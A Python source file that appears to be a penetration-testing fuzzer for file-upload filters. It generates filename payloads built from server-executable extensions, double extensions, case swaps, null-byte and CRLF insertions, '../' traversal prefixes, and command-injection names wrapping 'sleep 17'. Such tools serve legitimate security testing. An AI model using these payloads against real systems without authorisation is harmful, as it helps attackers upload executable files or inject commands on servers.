import random

class UploadFileNameGenerator():
    def __init__(self):
        self.base_filename = "filename.jpg"

        self.original_extension = ""
        self.original_filename = ""

        self.php_extensions = [".php", ".php3", ".php5", ".php7", ".pht", ".phps", ".phar", ".phpt", ".pgif", ".phtml", ".phtm", ".inc"]
        self.asp_extensions = [".asp", ".aspx", ".cer", ".config", ".asa", ".soap"]
        self.jsp_extensions = [".jsp", ".jspx", ".jsw", ".jsv", ".jsfp", ".wss", ".do", ".actions"]
        self.perl_extensions = [".pl", ".pm", ".cgi", ".jib"]
        self.coldfusion_extensions = [".cfm", ".cfml", ".cfc", ".dbm"]
        self.nodejs_extensions = [".js", ".json", ".node"]
        self.custom_extensions = []

        # this is mofifable only a base values are assigned
        self.allowed_extensions = [".jpg",".png", ".jpeg", ".svg"]

        self.commands = ["sleep 17", "timeout /T 17"]

        self.generate_php = False
        self.generate_asp = False
        self.generate_jsp = False
        self.generate_perl = False
        self.generate_coldfusion = False
        self.generate_nodejs = False
        self.generate_custom = False

        self.max_depth = 10

        # Payload Modification
        self.swapcase = False
        self.double = False
        self.nullnames = False
        self.dotnames = False
        self.slashnames = False
        self.path_traversal = False
        self.command_injection = False

    def generate_payloads(self):
        filenames = []

        # obtain the filename and the original extension
        self.original_filename, self.original_extension = self.base_filename.split(".",1)
        
        # Add the original extension into the allowed extensions if not in it already
        if self.original_extension not in self.allowed_extensions:
            self.allowed_extensions.append("."+self.original_extension)

        # append dot to allowed extensions if missing
        self.allowed_extensions = [a if a.startswith(".") else f".{a}" for a in self.allowed_extensions]        

        # generate single extenions with change
        f = self.generate_single_extension_change_filenames()        
        filenames.extend(f)

        if self.double:
            d = self.generate_double_extensions()
            filenames.extend(d)

        if self.swapcase:
            s = self.generate_swapcase()
            filenames.extend(s)

        if self.nullnames:
            n = self.generate_null_filenames()
            filenames.extend(n)

        if self.dotnames:
            dt = self.generate_dots_after_filenames()
            filenames.extend(dt)

        if self.slashnames:
            sl = self.generate_slashes()
            filenames.extend(sl)

        if self.path_traversal:
            tr = self.generate_traversal()
            filenames.extend(tr)

        if self.command_injection:
            ci = self.generate_command_injection_filenames()
            filenames.extend(ci)

        return list(set(filenames))


    def generate_all_payloads(self):
        filenames = []

        # obtain the filename and the original extension
        self.original_filename, self.original_extension = self.base_filename.split(".",1)
        
        # Add the original extension into the allowed extensions if not in it already
        if self.original_extension not in self.allowed_extensions:
            self.allowed_extensions.append("."+self.original_extension)

        # append dot to allowed extensions if missing
        self.allowed_extensions = [a if a.startswith(".") else f".{a}" for a in self.allowed_extensions] 


        # generate single extenions with change
        f = self.generate_single_extension_change_filenames()        
        filenames.extend(f)


        d = self.generate_double_extensions()
        filenames.extend(d)

        s = self.generate_swapcase()
        filenames.extend(s)

        n = self.generate_null_filenames()
        filenames.extend(n)

        dt = self.generate_dots_after_filenames()
        filenames.extend(dt)

        sl = self.generate_slashes()
        filenames.extend(sl)

        tr = self.generate_traversal()
        filenames.extend(tr)

        ci = self.generate_command_injection_filenames()
        filenames.extend(ci)

        return list(set(filenames))


    def generate_single_extension_change_filenames(self):
        result = []

        target_extensions = self.get_target_extensions()
        result.extend([f"{self.original_filename}{ext}" for ext in target_extensions])

        return result

    def get_target_extensions(self):
        result = []

        if self.generate_php:
            result.extend(self.php_extensions)

        if self.generate_asp:
            result.extend(self.asp_extensions)

        if self.generate_jsp:
            result.extend(self.jsp_extensions)

        if self.generate_perl:
            result.extend(self.perl_extensions)

        if self.generate_nodejs:
            result.extend(self.nodejs_extensions)

        if self.generate_coldfusion:
            result.extend(self.coldfusion_extensions)
        
        if self.generate_custom:
            result.extend(self.custom_extensions)

        return list(set([ext if ext.startswith(".") else f".{ext}" for ext in result]))

    def generate_double_extensions(self):
        result = []

        target_extensions = self.get_target_extensions()

        for allowed_ext in self.allowed_extensions:
            for target_ext in target_extensions:
                result.append(f"{self.original_filename}{allowed_ext}{target_ext}")
                result.append(f"{self.original_filename}{target_ext}{allowed_ext}")

        return result

    def generate_swapcase(self):
        result = []

        target_extensions = self.get_target_extensions()

        for allowed_ext in self.allowed_extensions:
            for target_ext in target_extensions:
                swapped = "".join(random.choice([char.upper(), char.lower()]) for char in target_ext)
                result.append(f"{self.original_filename}{allowed_ext}{swapped}")
                result.append(f"{self.original_filename}{swapped}{allowed_ext}")

        return result

    def generate_null_filenames(self):
        result = []

        target_extensions = self.get_target_extensions()
        nullbytes = ["%00", "\\x00","%0d", "%0a", "%0d%0a","%20"]

        for allowed_ext in self.allowed_extensions:
            for target_ext in target_extensions:
                for nullbyte in nullbytes:
                    result.append(f"{self.original_filename}{target_ext}{nullbyte}{allowed_ext}")

        return result

    def generate_dots_after_filenames(self):
        result = []

        target_extensions = self.get_target_extensions()
        dots = [""*8,"."*16,"."*32]
        result.extend([f"{self.original_filename}{ext}{dot}" for ext in target_extensions for dot in dots])

        return result

    def generate_slashes(self):
        result = []
        target_extensions = self.get_target_extensions()

        mod_ext = []
        # ext/  ext.\  e\xt  e/xt
        for t in target_extensions:
            mod_ext.append(t+"/")
            mod_ext.append(t+".\\")
            mod_ext.append(t[:1]+"/"+t[1:])
            mod_ext.append(t[:1]+"\\"+t[1:])

        fnames = []
        single = self.generate_single_extension_change_filenames()
        double = self.generate_double_extensions()
        fnames.extend(single)
        fnames.extend(double)

        for f in fnames:
            for target_ext in target_extensions:
                for mod in mod_ext:
                    if target_ext in f:
                        result.append(f.replace(target_ext,mod))
        return result

    def generate_allowed_filenames(self):
        
        return [ f"{self.original_filename}{f}" for f in self.allowed_extensions ]

    def generate_traversal(self):
        traversal = []

        t = "../"
        for i in range(1,self.max_depth): traversal.append(t*i)

        allowed = self.generate_allowed_filenames() 
        single = self.generate_single_extension_change_filenames()

        filenames = allowed + single

        return [f"{trav}{fname}" for fname in filenames for trav in traversal] 

    def generate_command_injection_filenames(self):
        separators = [";", "|", "&"]

        res = [[c,f"{s}{c}",f"{s}{s}{c}", f"{c}{s}{s}", f"{s}{c}{s}", f"{s}{s}{c}{s}{s}"] for c in self.commands for s in separators]
        uniq_commands = list(set([i for r in res for i in r]))

        # generate with orig extension
        orig_com = [f"{com}.{self.original_extension}" for com in uniq_commands]

        return list(set(uniq_commands+orig_com))



